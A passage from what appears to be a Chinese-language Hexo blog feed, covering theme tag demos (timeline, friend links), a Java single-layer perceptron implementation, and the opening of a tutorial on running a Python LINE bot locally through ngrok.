/ green)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% timeline 2022 %&#125;</span><br><span class="line">&lt;!-- timeline 01-02 --&gt;</span><br><span class="line">這是測試頁面</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><div class="timeline undefined"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-02</p></div></div><div class='timeline-item-content'><p>這是測試頁面</p></div></div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% timeline 2022,red %&#125;</span><br><span class="line">&lt;!-- timeline 01-02 --&gt;</span><br><span class="line">這是測試頁面</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><div class="timeline red"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-02</p></div></div><div class='timeline-item-content'><p>這是測試頁面</p></div></div></div><h3 id="flink-友情連結"><a class="markdownIt-Anchor" href="#flink-友情連結"></a> flink 友情連結</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% flink %&#125;</span><br><span class="line">- class_name: 友情鏈接</span><br><span class="line">  class_desc: 那些人，那些事</span><br><span class="line">  link_list:</span><br><span class="line">    - name: JerryC</span><br><span class="line">      link: https://jerryc.me/</span><br><span class="line">      avatar: https://jerryc.me/img/avatar.png</span><br><span class="line">      descr: 今日事,今日畢</span><br><span class="line">    - name: Hexo</span><br><span class="line">      link: https://hexo.io/zh-tw/</span><br><span class="line">      avatar: https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg</span><br><span class="line">      descr: 快速、簡單且強大的網誌框架</span><br><span class="line"></span><br><span class="line">- class_name: 網站</span><br><span class="line">  class_desc: 值得推薦的網站</span><br><span class="line">  link_list:</span><br><span class="line">    - name: Youtube</span><br><span class="line">      link: https://www.youtube.com/</span><br><span class="line">      avatar: https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png</span><br><span class="line">      descr: 視頻網站</span><br><span class="line">    - name: Weibo</span><br><span class="line">      link: https://www.weibo.com/</span><br><span class="line">      avatar: https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png</span><br><span class="line">      descr: 中國最大社交分享平台</span><br><span class="line">    - name: Twitter</span><br><span class="line">      link: https://twitter.com/</span><br><span class="line">      avatar: https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png</span><br><span class="line">      descr: 社交分享平台</span><br><span class="line">&#123;% endflink %&#125;</span><br></pre></td></tr></table></figure><div class="flink"><div class="flink-name">友情鏈接</div><div class="flink-desc">那些人，那些事</div> <div class="flink-list">          <div class="flink-list-item">            <a href="https://jerryc.me/" title="JerryC" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://jerryc.me/img/avatar.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="JerryC" />              </div>              <div class="flink-item-name">JerryC</div>               <div class="flink-item-desc" title="今日事,今日畢">今日事,今日畢</div>            </a>          </div>          <div class="flink-list-item">            <a href="https://hexo.io/zh-tw/" title="Hexo" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Hexo" />              </div>              <div class="flink-item-name">Hexo</div>               <div class="flink-item-desc" title="快速、簡單且強大的網誌框架">快速、簡單且強大的網誌框架</div>            </a>          </div></div><div class="flink-name">網站</div><div class="flink-desc">值得推薦的網站</div> <div class="flink-list">          <div class="flink-list-item">            <a href="https://www.youtube.com/" title="Youtube" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Youtube" />              </div>              <div class="flink-item-name">Youtube</div>               <div class="flink-item-desc" title="視頻網站">視頻網站</div>            </a>          </div>          <div class="flink-list-item">            <a href="https://www.weibo.com/" title="Weibo" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Weibo" />              </div>              <div class="flink-item-name">Weibo</div>               <div class="flink-item-desc" title="中國最大社交分享平台">中國最大社交分享平台</div>            </a>          </div>          <div class="flink-list-item">            <a href="https://twitter.com/" title="Twitter" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="Twitter" />              </div>              <div class="flink-item-name">Twitter</div>               <div class="flink-item-desc" title="社交分享平台">社交分享平台</div>            </a>          </div></div></div>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java 單層感知機實作</title>
      <link href="/perceptron/"/>
      <url>/perceptron/</url>
      
        <content type="html"><![CDATA[<p>因為類神經網路課程順便寫的，盡量簡潔和只使用單一 class，開箱即用，希望可以幫助到大家。</p><p>氣死網路上完全查不到這類型的相關程式碼乾脆自己發。</p><span id="more"></span><p>底下就是單層感知機的實作</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 單層感知機</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Afan Chen</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Perceptron</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">eta</span> <span class="operator">=</span> <span class="number">0.01</span>;    <span class="comment">//學習率</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">nIter</span> <span class="operator">=</span> <span class="number">50</span>;       <span class="comment">//迭代次數</span></span><br><span class="line">    <span class="keyword">private</span> ArrayList&lt;Integer&gt; errors;   <span class="comment">//預測錯誤數量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span>[] w;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用預設學習率的建構子</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Perceptron</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 建構子</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> eta 學習率</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nIter 迭代次數</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Perceptron</span><span class="params">(<span class="type">double</span> eta, <span class="type">int</span> nIter)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.eta = eta;</span><br><span class="line">        <span class="built_in">this</span>.nIter = nIter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根據設定的eta跟迭代次數進行訓練</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> y label</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fit</span><span class="params">(<span class="type">double</span>[][] x, <span class="type">double</span>[] y)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        w = <span class="keyword">new</span> <span class="title class_">double</span>[x[<span class="number">0</span>].length + <span class="number">1</span>];</span><br><span class="line">        errors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; w.length; i++) &#123;</span><br><span class="line">            w[i] = random.nextGaussian();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nIter; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">error</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; y.length; j++) &#123;</span><br><span class="line">                <span class="type">double</span> <span class="variable">update</span> <span class="operator">=</span> eta * (y[j] - predict(x[j]));<span class="comment">//更新權重值</span></span><br><span class="line">                w[w.length - <span class="number">1</span>] += update;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; x[j].length; k++) &#123;</span><br><span class="line">                    w[k] += update * x[j][k];</span><br><span class="line">                &#125;</span><br><span class="line">                error += update != <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            errors.add(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用來給我存取訓練過程中有多少的訓練錯誤</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">epochError</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 其實是update，只是我拿來畫迭代瞬間的圖</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> y label</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> w weight</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> new weight</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span>[] epoch(<span class="type">double</span>[][] x, <span class="type">double</span>[] y, <span class="type">double</span>[] w) &#123;</span><br><span class="line">        <span class="built_in">this</span>.w = w;</span><br><span class="line">        epochError = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; y.length; j++) &#123;</span><br><span class="line">            <span class="type">double</span> <span class="variable">update</span> <span class="operator">=</span> eta * (y[j] - predict(x[j]));<span class="comment">//更新權重值</span></span><br><span class="line">            w[w.length - <span class="number">1</span>] += update;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; x[j].length; k++) &#123;</span><br><span class="line">                w[k] += update * x[j][k];</span><br><span class="line">            &#125;</span><br><span class="line">            epochError += update != <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> w;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 雖然念起來是內積，但要注意他有先加上weights的最後一項(常數項)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 單筆data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 內積結果加上常數項</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="title function_">dot</span><span class="params">(<span class="type">double</span>[] x)</span> &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">pred</span> <span class="operator">=</span> w[x.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; x.length; i++) &#123;</span><br><span class="line">            pred += x[i] * w[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pred;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 因為我要畫迭代的圖就又創了這個，把權重部分獨立出來</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 單筆data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> weight 要傳入的權重</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 內積結果加上常數項</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="title function_">dot</span><span class="params">(<span class="type">double</span>[] x, <span class="type">double</span>[] weight)</span> &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">pred</span> <span class="operator">=</span> weight[x.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; x.length; i++) &#123;</span><br><span class="line">            pred += x[i] * weight[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pred;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 預測出結果是1 or -1</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 單筆data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 1 or -1 的預測值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">predict</span><span class="params">(<span class="type">double</span>[] x)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dot(x) &gt;= <span class="number">0</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 預測出結果是1 or -1</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x 單筆data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 1 or -1 的預測值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">predict</span><span class="params">(<span class="type">double</span>[] x, <span class="type">double</span>[] w)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dot(x, w) &gt;= <span class="number">0</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 把用fit function訓練出來過程紀錄的error list取出來</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> error list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">getErrors</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> errors;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 獲取 weight</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> weight</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span>[] getW() &#123;</span><br><span class="line">        <span class="keyword">return</span> w;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 設定 weight</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> w weight</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setW</span><span class="params">(<span class="type">double</span>[] w)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.w = w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就這樣，不要拿走說是自己寫的就好。</p>]]></content>
      
      
      <categories>
          
          <category> 機器學習 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用 python 快速進行 line bot 開發</title>
      <link href="/line-bot-developers-1/"/>
      <url>/line-bot-developers-1/</url>
      
        <content type="html"><![CDATA[<p>最近小摸了一下 line bot 的技術，老實說還算簡單好玩，但是感覺雷有點多，就乾脆自己寫了一篇簡單的初階教學。(x)</p><p>簡單的部分我跳過了，不然字數會太多，主要會圍繞在<a href="https://developers.line.biz/en/docs/"> line bot 官方文件</a>的解讀上，由於這種文章都會有時效性，如果不能照著做的話請通知我，雖然我也不一定會更新就是了，也歡迎直接觀看 document。</p><p>首先，來看看 Line 給開發者進行 API 對接的模式。</p><img src="/line-bot-developers-1/channel-access-token.png" class=""><span id="more"></span><p>從上圖中，可以很清楚的看到 line bot 中伺服器如何與 line server 進行對接和保障對話的安全性。</p><p>首先，大家請到 <a href="https://developers.line.biz/console">line的開發者平台</a> 上面驗證和註冊。</p><p>資料隨便填，註冊過程歡迎觀看 [30 天教你如何玩弄 Line bot API] 第 1 天：玩弄 Line bot API 第一步](<a href="https://ithelp.ithome.com.tw/articles/10215656">https://ithelp.ithome.com.tw/articles/10215656</a>)。</p><p>註冊完全不是問題點，創建好 line bot 之後會給你必要的 token 等等，如果需要另外創建的話，可以另外使用 Assertion Signing Key ，生成可以到 <a href="https://mkjwk.org/">https://mkjwk.org/</a> 此網站進行。</p><img src="/line-bot-developers-1/RSA256_generator.png" class=""><p>按照這樣子選完之後將 public key 複製到 Assertion Signing Key 的申請欄位就好。</p><p>或者是可以在 Chrome 內的 js 控制台中輸入以下 code 並運行來生成。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> pair = <span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">generateKey</span>(</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;RSASSA-PKCS1-v1_5&#x27;</span>,</span><br><span class="line">      <span class="attr">modulusLength</span>: <span class="number">2048</span>,</span><br><span class="line">      <span class="attr">publicExponent</span>: <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]),</span><br><span class="line">      <span class="attr">hash</span>: <span class="string">&#x27;SHA-256&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="literal">true</span>,</span><br><span class="line">    [<span class="string">&#x27;sign&#x27;</span>, <span class="string">&#x27;verify&#x27;</span>]</span><br><span class="line">  );</span><br><span class="line">   </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;=== private key ===&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">exportKey</span>(<span class="string">&#x27;jwk&#x27;</span>, pair.<span class="property">privateKey</span>), <span class="literal">null</span>, <span class="string">&#x27;  &#x27;</span>));</span><br><span class="line">   </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;=== public key ===&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="keyword">await</span> crypto.<span class="property">subtle</span>.<span class="title function_">exportKey</span>(<span class="string">&#x27;jwk&#x27;</span>, pair.<span class="property">publicKey</span>), <span class="literal">null</span>, <span class="string">&#x27;  &#x27;</span>)); </span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>以下是本地端伺服器跟 line server 進行交互的架構圖。</p><img src="/line-bot-developers-1/channel-access-token-issue-flow.svg" class=""><p>不過這是非必要的啦，一般來說採用系統給的 channel-access-token 就行。</p><p>我一開始是用 js 摸的，後來覺得 python 比較熟一點就改用 python 了，接下來會講到如何在本地端搭起一個 server 來回應傳來的資訊。</p><p>我先介紹一下 python 要做哪些動作才能進行自動回覆訊息的功能。</p><h3 id="先建立一個-python-的虛擬環境"><a class="markdownIt-Anchor" href="#先建立一個-python-的虛擬環境"></a> 先建立一個 python 的虛擬環境</h3><p>我是用 pychorm IDE 的自動建置虛擬環境，比較簡單一點，如果你是新手，也歡迎直接使用 pychorm，建置版本要求 Python &gt;= 2.7 or &gt;= 3.4，為求穩定和後續開發的間容性我使用3.7。</p><h3 id="下載-line-bot-sdk"><a class="markdownIt-Anchor" href="#下載-line-bot-sdk"></a> 下載 line-bot-sdk 。</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install line-bot-sdk</span><br></pre></td></tr></table></figure><h3 id="輸入程式碼"><a class="markdownIt-Anchor" href="#輸入程式碼"></a> 輸入程式碼</h3><p>以下由 line bot 的官方說明文件範例進行小改寫後講解，先隨便建立一個.py檔案將以下程式碼輸入。</p><p><a href="https://github.com/line/line-bot-sdk-python">官方 github</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> linebot <span class="keyword">import</span> (</span><br><span class="line">    LineBotApi, WebhookParser</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> linebot.exceptions <span class="keyword">import</span> (</span><br><span class="line">    InvalidSignatureError</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> linebot.models <span class="keyword">import</span> (</span><br><span class="line">    MessageEvent, TextMessage, TextSendMessage,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get channel_secret and channel_access_token from your environment variable</span></span><br><span class="line">channel_secret = os.getenv(<span class="string">&#x27;LINE_CHANNEL_SECRET&#x27;</span>, <span class="string">&#x27;你的CHANNEL_SECRET&#x27;</span>)</span><br><span class="line">channel_access_token = os.getenv(<span class="string">&#x27;LINE_CHANNEL_ACCESS_TOKEN&#x27;</span>, <span class="string">&#x27;你的CHANNEL_ACCESS_TOKEN&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> channel_secret <span class="keyword">is</span> <span class="string">&#x27;你的CHANNEL_SECRET&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Specify LINE_CHANNEL_SECRET as environment variable.&#x27;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> channel_access_token <span class="keyword">is</span> <span class="string">&#x27;你的CHANNEL_ACCESS_TOKEN&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Specify LINE_CHANNEL_ACCESS_TOKEN as environment variable.&#x27;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">line_bot_api = LineBotApi(channel_access_token)</span><br><span class="line">parser = WebhookParser(channel_secret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/callback&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback</span>():</span><br><span class="line">    signature = request.headers[<span class="string">&#x27;X-Line-Signature&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get request body as text</span></span><br><span class="line">    body = request.get_data(as_text=<span class="literal">True</span>)</span><br><span class="line">    app.logger.info(<span class="string">&quot;Request body: &quot;</span> + body)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># parse webhook body</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        events = parser.parse(body, signature)</span><br><span class="line">    <span class="keyword">except</span> InvalidSignatureError:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if event is MessageEvent and message is TextMessage, then echo text</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> events:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(event, MessageEvent):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(event.message, TextMessage):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        line_bot_api.reply_message(</span><br><span class="line">            event.reply_token,</span><br><span class="line">            TextSendMessage(text=event.message.text)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;OK&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    arg_parser = ArgumentParser(</span><br><span class="line">        usage=<span class="string">&#x27;Usage: python &#x27;</span> + __file__ + <span class="string">&#x27; [--port &lt;port&gt;] [--help]&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    arg_parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">8000</span>, <span class="built_in">help</span>=<span class="string">&#x27;port&#x27;</span>)</span><br><span class="line">    arg_parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--debug&#x27;</span>, default=<span class="literal">False</span>, <span class="built_in">help</span>=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    options = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line">    app.run(debug=options.debug, port=options.port)</span><br></pre></td></tr></table></figure><p>這邊在後面要重填一下在註冊好的 <a href="https://developers.line.biz/console">https://developers.line.biz/console</a> 當中 Basic settings 內的 Channel secret 以及 Messaging API settings 中的 Channel access token (long-lived) 項目。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">channel_secret = os.getenv(<span class="string">&#x27;LINE_CHANNEL_SECRET&#x27;</span>, <span class="string">&#x27;你的 Channel secret&#x27;</span>)</span><br><span class="line">channel_access_token = os.getenv(<span class="string">&#x27;LINE_CHANNEL_ACCESS_TOKEN&#x27;</span>, <span class="string">&#x27;你的 Channel access token&#x27;</span>)</span><br></pre></td></tr></table></figure><p>沒有改直接跑的話，程式碼會出現下面字樣來提醒。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Specify LINE_CHANNEL_SECRET as environment variable.</span><br><span class="line">or</span><br><span class="line">Specify LINE_CHANNEL_ACCESS_TOKEN as environment variable.</span><br></pre></td></tr></table></figure><p><strong>不需要下載其他 lib 這樣就可以跑了。</strong></p><h3 id="讓程式可以跟外網溝通"><a class="markdownIt-Anchor" href="#讓程式可以跟外網溝通"></a> 讓程式可以跟外網溝通</h3><p>但是我們會遇到下一個問題，跑完之後他會連到的位置是 <a href="http://localhost:8000">http://localhost:8000</a>，而 line 的伺服器無法從外網送資料進入內網給程式，也拿不到要傳給使用者的內容。</p><p>這個時候就需要到 <a href="https://dashboard.ngrok.com/get-started/setup">ngrok 下載處</a>把他下載下來，ngrok 可以方便的將內網轉換成外網的一個隨機網址。</p><p>然後下面的運行部分是在 linux 環境下的指令，所以 windows 會出現找不到指令的情形，這個時候就到下載好解壓縮完的 ngrok.exe 所在資料夾，記下路徑然後在虛擬環境內新開一個 terminal (終端)，將路徑導向程式所在資料夾。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd C:\path to file</span><br></pre></td></tr></table></figure><p>接下來輸入下面的指令。</p><h4 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> windows</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ngrok.exe http <span class="number">8000</span></span><br></pre></td></tr></table></figure><h4 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> linux</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">./ngrok http <span class="number">80</span></span><br></pre></td></tr></table></figure><p>就可以看到類似以下的介面。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ngrok by @inconshreveable                                                                                                                                                                                              (Ctrl+C to quit)</span><br><span class="line"></span><br><span class="line">Session Status                online</span><br><span class="line">Session Expires               <span class="number">1</span> hour, <span class="number">8</span> minutes</span><br><span class="line">Version                       <span class="number">2.3</span><span class="number">.40</span></span><br><span class="line">Region                        United States (us)</span><br><span class="line">Web Interface                 http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">4041</span></span><br><span class="line">Forwarding                    http://<span class="number">3327</span>-<span class="number">218</span>-<span class="number">166</span>-<span class="number">17</span>-<span class="number">89.</span>ngrok.io -&gt; http://localhost:<span class="number">8000</span></span><br><span class="line">Forwarding                    https://<span class="number">3327</span>-<span class="number">218</span>-<span class="number">166</span>-<span class="number">17</span>-<span 